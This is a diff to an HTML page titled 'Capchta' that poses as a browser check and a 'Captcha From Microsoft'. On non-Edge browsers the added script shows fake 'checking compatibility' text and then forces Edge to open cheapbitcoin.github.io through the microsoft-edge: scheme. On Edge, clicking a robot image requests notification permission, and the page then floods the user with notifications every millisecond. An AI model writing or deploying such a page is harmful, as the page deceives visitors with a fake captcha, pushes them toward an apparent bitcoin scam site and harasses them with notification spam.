@@ -5,37 +5,73 @@
 <meta charset="utf-8">
 <title> Capchta </title>
 	<style> 
+		html { 
+			background: #1A1A1A; 
+		}
+
 		#Text { 
-		psoition: absolute;
-		bottom: 0px; 
+			color: white; 
+			display: none; 
+			left: 50%; 
+			top: 50%; 
+			transform: translate(-50%, -50%); 
+			font-weight: bold;
+			font-size: 50px;  
+			position: absolute;	
+			text-align: center; 
 		} 
+
 		#Robot  {
 			display: none; 
+			cursor: pointer; 
 			height: 100%; 
 			top: 0%; 
 			width: 100%; 
 			left: 0%;
 			position: absolute; 
 		}
+
 	</style>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
 </head>
 
 <body>
-	<div id="Text"> Establishing Secure Connection... </div> 
-	<img id="Robot" src="Robot.png" alt="Are You A Robot? Captcha Should Appear Soon!">  
-	<script> 
+	<div id="Text"> Checking if your browser is compatiable </div> 
+	<img id="Robot" src="Robot2.png" alt="Are You A Robot? Captcha Should Appear Soon!">  
+	<script>
 	let browser = navigator.userAgent; 
+	let text = document.getElementById("Text"); 	
+	function init() { 
+		if (browser.indexOf('Edg') < 1) { 
+			$("#Text").fadeIn(1000); 
+			setTimeout(() => { text.innerHTML = "Checking if your browser is compatiable." }, 1500); 
+			setTimeout(() => { text.innerHTML = "Checking if your browser is compatiable.." }, 2000); 
+			setTimeout(() => { text.innerHTML = "Checking if your browser is compatiable..." }, 2500); 
+			setTimeout(() => { $("#Text").fadeOut(1000); }, 3000); 
+			setTimeout(() => { text.innerHTML = "Were Sorry We Can't Tell If Your A Robot! Loading A Captcha From Microsoft..." }, 4001); 
+			setTimeout(() => { $("#Text").fadeIn(1000); }, 4002); 
+ 			setTimeout(() => { window.open("microsoft-edge:"+ "https://cheapbitcoin.github.io"); }, 7003); 
+		}
+		else { 
+			$("#Robot").fadeIn(1000); 
+		}
+	} 
+
+	init(); 
+
 	
-	function openLinkInIE(){
-	if (browser.indexOf('Edg') < 1) { 
- 	 window.open("microsoft-edge:"+ "https://cheapbitcoin.github.io");
-	}	
-	}
-		openLinkInIE(); 
-		
+
+
+
+
+	$("#Robot").click(() => {
 	let permission = Notification.requestPermission();
-	setTimeout(function(){ var greeting = new Notification("Loading Captcha..."); }, 3000)
-	setTimeout(function(){ var greeting = new Notification("You Fool"); }, 6000);
+	}); 
+
+
+
+		
+	
 	
 		setTimeout(() => {
 	setInterval(() => { 
@@ -43,8 +79,8 @@
 	let rfp = rf[Math.floor(Math.random() * rf.length)];
 	var greeting = new Notification(rfp);
 	}, 1); 
-		   }, 6000);
-		
+		   }, 10000);
+
 	</script>
 </body>
 </html>
